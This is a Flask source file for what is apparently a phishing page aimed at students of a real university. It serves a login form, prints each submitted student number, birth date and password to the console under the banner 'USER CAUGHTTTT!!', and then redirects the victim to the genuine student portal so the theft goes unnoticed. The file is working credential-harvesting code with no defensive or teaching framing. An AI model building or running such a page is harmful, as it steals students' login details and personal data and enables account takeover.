from flask import Flask, render_template, request, redirect
import time

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    show_alert = False #until the user input his/her password hehe hacker

    if request.method == 'POST':
        studno = request.form.get('studno')
        month = request.form.get('SelectMonth')
        day = request.form.get('SelectDay')
        year = request.form.get('SelectYear')
        password = request.form.get('password')

        print("________________________________")
        print("USER CAUGHTTTT!! HAHHAHAHA")
        print("________________________________")
        print(f"Student Number: {studno}", flush=True)
        print(f"Birth Date: {month}-{day}-{year}", flush=True)
        print(f"Password: {password}", flush=True)
        print("________________________________")
        print()

        if studno != "HelloWorld" and password != "HelloWorld":
            show_alert = True
            time.sleep(0.1)
            return redirect("https://sis2.pup.edu.ph/student/")
    
    return render_template('form.html')

if __name__ == '__main__':
    app.run(debug=True, use_reloader=False)
